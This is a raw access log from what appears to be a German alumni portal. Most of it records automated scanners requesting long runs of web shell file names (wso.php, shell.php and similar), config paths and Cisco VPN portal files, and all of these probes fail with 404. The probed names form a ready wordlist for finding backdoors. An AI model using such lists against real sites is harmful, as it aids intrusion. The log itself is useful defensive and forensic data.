a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:23:43;;/view.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:23:44;;/wso.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:23:46;;/sid3.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:23:47;;/mans.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:23:48;;/111.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:23:49;;/403.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:23:50;;/4yps5d.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:23:50;;/f6.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:23:51;;/fs6.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:23:52;;/lv.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:23:53;;/habhan.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:23:54;;/akcc.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:23:55;;/bi1f.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:23:56;;/lib.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:23:57;;/luxe.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:23:58;;/wsd.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:23:59;;/404.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:23:59;;/an7.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:00;;/fs7.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:01;;/new4.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:02;;/icon.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:03;;/blox.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:03;;/gm.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:05;;/iko.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:06;;/miso.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:07;;/moie.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:07;;/shelp.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:09;;/siln.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:09;;/sko.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:10;;/3.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:11;;/wp-gif.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:12;;/wp-good.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:13;;/rrr.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:14;;/rxzx.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:14;;/tj.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:16;;/vansec.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:16;;/filesss.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:17;;/ss.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:18;;/wp-is.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:19;;/jmfi2.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:20;;/scx.php7;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:21;;/777.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:22;;/f35.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:23;;/ioxi-o.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:23;;/csv.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:24;;/shlo.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:25;;/abc.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:26;;/wpc1.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:27;;/ww.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:27;;/raw.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:28;;/mah.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:29;;/p.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:30;;/xpas22.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:31;;/wp1.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:32;;/fm.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:33;;/eauu.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:34;;/css.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:35;;/ru.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:36;;/tmpls.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:36;;/shell.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:37;;/ae.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:38;;/smpx.php;GET;404
b59dc1479c01cfab70d976e5c09b1e3144f9fb8ee45614bde92fa15a86ed6788;2025-11-12 11:24:38;;/;GET;200
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:39;;/wp-asd.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:40;;/class5.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:41;;/yas.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:42;;/yanki.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:42;;/g7y.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:43;;/ok.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:44;;/yasnu.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:45;;/moon.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:46;;/wio.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:47;;/oswkk.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:48;;/rex.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:49;;/aj.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:50;;/snus.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:51;;/naxc.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:51;;/v3.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:52;;/nc4.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:53;;/api137.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:54;;/class629.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:54;;/wp-x7.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:55;;/wp670.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:56;;/Okxob.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:57;;/Sanskrit.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:58;;/jq.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:24:59;;/x7.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:25:00;;/zex.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:25:01;;/zxin.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:25:02;;/asd67.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:25:03;;/st.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:25:03;;/an.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:25:05;;/enkkk.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:25:05;;/ext.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:25:06;;/fe5.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:25:07;;/13.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:25:08;;/wp.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:25:09;;/wp-freya.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:25:10;;/hello.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:25:11;;/ex.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:25:11;;/lock1.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:25:12;;/mini.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:25:13;;/ups.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:25:14;;/bes.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:25:15;;/wp-swa.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:25:16;;/42u.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:25:17;;/lc.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:25:17;;/gmo.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:25:18;;/CLA.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:25:19;;/gfile.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:25:20;;/ahax.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:25:21;;/gold.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:25:22;;/ol.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:25:23;;/wp-gr.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:25:23;;/co.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:25:24;;/aua.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:25:25;;/aa.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:25:26;;/great.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:25:27;;/class9.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:25:27;;/pass.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:25:28;;/lock360.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:25:29;;/ot.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:25:30;;/witmm.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:25:31;;/lo.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:25:31;;/goods.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:25:32;;/chosen.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:25:33;;/vxrl.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:25:34;;/vxonb.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:25:35;;/wozxsh.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:25:36;;/whf.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:25:36;;/bkxzo.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:25:37;;/okxoby.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:25:38;;/error1.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:25:39;;/xtt.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:25:43;;/autoload_classmap.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:25:44;;/wcas.php;GET;404
2f171aebb9ec8fab84ffc23d9189d698cca5b00c8a00576827d6f4acac5a8909;2025-11-12 11:28:04;;/gruppen/hobby/tanzen;GET;302
2f171aebb9ec8fab84ffc23d9189d698cca5b00c8a00576827d6f4acac5a8909;2025-11-12 11:28:08;/gruppen/hobby/tanzen;/gruppen;GET;200
ee93ed4ca46b5f3909d5319380f28ed9bd0a111f40eb3e60e861d0ef16a41d73;2025-11-12 11:28:27;;/captcha2.php?captcha=inf2024;GET;404
9b7086b19e3383668f6cc3d6359c8aa843fa203412cbac8af0287b225954ef16;2025-11-12 11:32:49;;/;GET;200
4a5606c5b3a9ea59460a6ad94a14b2ddc6ed1d42abfb5d084c5f020d519bc2a4;2025-11-12 11:37:45;;/.config;GET;404
4a5606c5b3a9ea59460a6ad94a14b2ddc6ed1d42abfb5d084c5f020d519bc2a4;2025-11-12 11:37:45;;/config;GET;404
94e382f58c667dffbd6abb636ec39f0b8d752af5370a563a6b988faa40c45aba;2025-11-12 11:39:48;;/personen;GET;200
d0be8bb7fd0be6aab6961e33f9c0abdac67db68697bff4dda37e33941f51e588;2025-11-12 11:41:38;;/personen/alumni/schule/03A04;GET;200
71f331bda3ff5a1b1880b5ed375ee4aaa4463d7945558b9cb3608207a62c0b22;2025-11-12 11:49:08;;/personen/alumni/schule/07A05;GET;200
3d26b1ba38a2b067d2d9cdb27e80b45e14a75bdb972c7e2a4a340184077f948f;2025-11-12 11:51:41;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
e51b3fc9c4c87067012b5eab88349bf1b58f1ba1ccd61ccb8b0ba061d6015ee7;2025-11-12 11:52:36;;/themen?category=kultur;GET;200
c6f815cf1e24e7ddcf8d6056d055713d865fe1a6293f635144731c9dfc09f9e5;2025-11-12 11:53:56;/personen/all/4;/personen/alumni/details/olaf-schaeffer;GET;200
942a1df54a0678721140eb67e150cf3574524549decdfdf7f3766c193f437216;2025-11-12 11:56:51;;/.well-known/traffic-advice;GET;404
d9baa08bce40e7d263ee9d29a469a268e45a4a41fbc5878bcf7e946b263e8fd3;2025-11-12 11:56:51;/;/personen/alumni/schule/170720;GET;200
69250c185eeb45405bf3c9785fe5ea4812bee9fe5f4264430ec363dcb1cf9ed4;2025-11-12 12:00:29;;/personen/alumni/schule/600027;GET;200
2811fbae51e0fe40fea8f2d639a03332ac315f817d2a292df6011e0edcd62736;2025-11-12 12:01:23;;/aktuelles/stellenangebote;GET;200
4a5606c5b3a9ea59460a6ad94a14b2ddc6ed1d42abfb5d084c5f020d519bc2a4;2025-11-12 12:02:19;;/config;GET;404
4a5606c5b3a9ea59460a6ad94a14b2ddc6ed1d42abfb5d084c5f020d519bc2a4;2025-11-12 12:02:19;;/.config;GET;404
9d18d06a85c4be0718cbb82c5bae70e3decf602ad4032fa3fc48d45e5157166b;2025-11-12 12:02:25;;/+CSCOL+/Java.jar;GET;404
9d18d06a85c4be0718cbb82c5bae70e3decf602ad4032fa3fc48d45e5157166b;2025-11-12 12:02:25;;/+CSCOE+/logon_forms.js;GET;404
9d18d06a85c4be0718cbb82c5bae70e3decf602ad4032fa3fc48d45e5157166b;2025-11-12 12:02:26;;/+CSCOL+/a1.jar;GET;404
9d18d06a85c4be0718cbb82c5bae70e3decf602ad4032fa3fc48d45e5157166b;2025-11-12 12:02:26;;/+CSCOE+/transfer.js;GET;404
153e34497b5d8e65da9577755a57cc045534c18e8e387af1df970be4bc9bc7dd;2025-11-12 12:08:47;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
12dc3e5f1e4d87973b7ff0f1de7a9896a51019936423ccffda343a8668eeb79c;2025-11-12 12:12:43;;/;GET;200
c04b0454831a3893c910575b64f2e06041d57b70e79e0f26faf97993aa5c41fa;2025-11-12 12:14:39;;/personen/alumni/schule/5507;GET;200
c3b92ba921dcfc41847dd00483fa3879137e3c4b820db7f40a3f78624cf1da8f;2025-11-12 12:17:14;/themen/details/was-kommt-nach-dem-abitur;/themen/details/was-kommt-nach-dem-abitur;GET;200
1f4b8a78a3cc025cfbbbe4b60b5eaa263dec53a96149eadb88d20057575a6689;2025-11-12 12:17:16;/;/;GET;200
540060ff0c27ecd033087cbeb4edb9eb48e2adc5db5713c493ff03d0613e6218;2025-11-12 12:21:12;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
8710226a8e1aad35fe2fb671859ecd878de32503cebcdd5ad62d75b1be6006b0;2025-11-12 12:29:56;;/personen/alumni/schule/9004;GET;200
b65004e96ff6287bb40899d94d558d9f6a7b9d699b80b912513a3b7448d2c695;2025-11-12 12:31:06;;/personen/alumni/details/sami-teuchert;GET;200
290191761fbf22c895dd9414a066fc80ff47751f0a3280001ae278ab18ef99aa;2025-11-12 12:31:39;;/themen/details/der-start-ins-studium;GET;200
c1dbcfe1961f7de120b0eaf2fca6a23fbf720046cbb2f4a7b76b5674488c736a;2025-11-12 12:32:28;;/personen/alumni/schule/5506;GET;200
0fe4f93a94f9a81effa170232096a2f980f135bf49e6165e2ed6c1e7d9a2ded1;2025-11-12 12:33:00;;/;GET;200
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:36:48;;/wp-content/plugins/hellopress/wp_filemanager.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:36:49;;/error.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:36:50;;/x.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:36:51;;/xx.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:36:52;;/222.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:36:53;;/444.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:36:54;;/file9.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:36:54;;/filesss.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:36:55;;/file88.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:36:56;;/gifclass4.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:36:57;;/class19.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:36:58;;/2clas.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:36:59;;/bless5.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:36:59;;/file15.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:00;;/333.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:01;;/alpa.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:02;;/file21.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:03;;/ut.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:04;;/inde.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:04;;/classgoto24.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:05;;/thh.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:06;;/fffff.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:07;;/indo.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:07;;/fileas.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:08;;/yellow.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:09;;/wfile.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:10;;/class20.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:11;;/build.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:11;;/1.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:12;;/usep.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:13;;/wa.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:14;;/wb.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:15;;/file1.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:16;;/gmo.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:16;;/info.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:17;;/file2.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:18;;/lv.php;GET;404
37fa8f11e970bb2599fec1fc07f72e102ef67b73d593ca50b15d65da6190a3ec;2025-11-12 12:37:19;;/about.php;GET;404
